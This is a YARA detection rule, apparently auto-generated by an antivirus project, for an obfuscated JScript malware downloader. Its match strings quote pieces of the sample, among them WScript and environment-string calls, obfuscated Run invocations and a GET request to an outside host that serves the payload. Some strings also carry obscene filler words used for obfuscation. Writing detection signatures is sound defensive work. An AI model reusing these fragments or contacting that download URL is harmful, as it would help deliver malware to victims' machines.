rule sig_20160428_6fe9fa4aab1a33b36d9cdf6751a87968 {
  meta:
    description = "datamaliciousorder - file 20160428_6fe9fa4aab1a33b36d9cdf6751a87968.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "0d8409c3359a0513c0fc3264a8f541b0a3ece5bfcbd4c648341700b83fdcfbb7"

  strings:
    $s1  = "function TwbVklZsiKxuSqoWprBst() {return FzlQgoHzlFgqLbjYjsNbg[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"" ascii
    $s2  = "function VdiGnuGecSsxYxjLbxVon(TdqNnlJnnGsgBtoExyPay){FzlQgoHzlFgqLbjYjsNbg[(\"Cunt\", \"anal\", \"R\")+ \"u\" + (\"fuck\", \"n" ascii
    $s3  = "function VdiGnuGecSsxYxjLbxVon(TdqNnlJnnGsgBtoExyPay){FzlQgoHzlFgqLbjYjsNbg[(\"Cunt\", \"anal\", \"R\")+ \"u\" + (\"fuck\", \"n" ascii
    $s4  = "function JftRdyDtsUbfOlkPxuSnv(YclCfeXmgIxuCiiFvmKpk, XybZcbAkzEnyUquMboKdc){VhiSquUotKtdVwrTedXzi = VhiSquUotKtdVwrTedXzi * 1; " ascii
    $s5  = "return YclCfeXmgIxuCiiFvmKpk - XybZcbAkzEnyUquMboKdc;};" fullword ascii
    $s6  = "var FzlQgoHzlFgqLbjYjsNbg = function EkkVxyHloKvqLsbZscNem() {return DoiAliRywXmhUnoOouKdo[ZkeIpsVuvPucRvbVvrGnl](\"WScript\"+\"" ascii
    $s7  = "CazHvcDjvPdjHalRgfVxe[NdnBgkByeLmnFeyJchSwr](\"G\" + \"ET\", \"http://yury2.nichost.ru/i7dksa\", false);" fullword ascii
    $s8  = "var FzlQgoHzlFgqLbjYjsNbg = function EkkVxyHloKvqLsbZscNem() {return DoiAliRywXmhUnoOouKdo[ZkeIpsVuvPucRvbVvrGnl](\"WScript\"+\"" ascii
    $s9  = "var DoiAliRywXmhUnoOouKdo = this[\"WScript\"];" fullword ascii
    $s10 = "function TwbVklZsiKxuSqoWprBst() {return FzlQgoHzlFgqLbjYjsNbg[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"" ascii
    $s11 = "function JftRdyDtsUbfOlkPxuSnv(YclCfeXmgIxuCiiFvmKpk, XybZcbAkzEnyUquMboKdc){VhiSquUotKtdVwrTedXzi = VhiSquUotKtdVwrTedXzi * 1; " ascii
    $s12 = "function ZzcMrnUriPonXseEbhAqb(){return JsnHtuEpaLiuQnmJjgVvj + \"\";};" fullword ascii
    $s13 = "function NbqHnfUoiXbzVbyDgfHqo() {return ((JkrSrcKwsPozSuiKgqNmv == true) && (JkrSrcKwsPozSuiKgqNmv == OukBlbMueUpfHomWceToe)) ?" ascii
    $s14 = "function NbqHnfUoiXbzVbyDgfHqo() {return ((JkrSrcKwsPozSuiKgqNmv == true) && (JkrSrcKwsPozSuiKgqNmv == OukBlbMueUpfHomWceToe)) ?" ascii
    $s15 = "OukBlbMueUpfHomWceToe = true; " fullword ascii
    $s16 = "function EyiOwbVelYzrFbxAcuYfd(ViiJchBntSuwEreItxKie) {var SnsVczXoiEmpDrtQbuAjw = (1, 2, 3, 4, 5, ViiJchBntSuwEreItxKie); retur" ascii
    $s17 = "PyyFudZhqGdgIqeKfxDkw = true;" fullword ascii
    $s18 = "}while (LpeJdtAxjXggYmlJocUsl);" fullword ascii
    $s19 = "var JkrSrcKwsPozSuiKgqNmv = false;" fullword ascii
    $s20 = "function OwwGdfWzfAqdYnsGwtChd(){return ZkeIpsVuvPucRvbVvrGnl;};" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}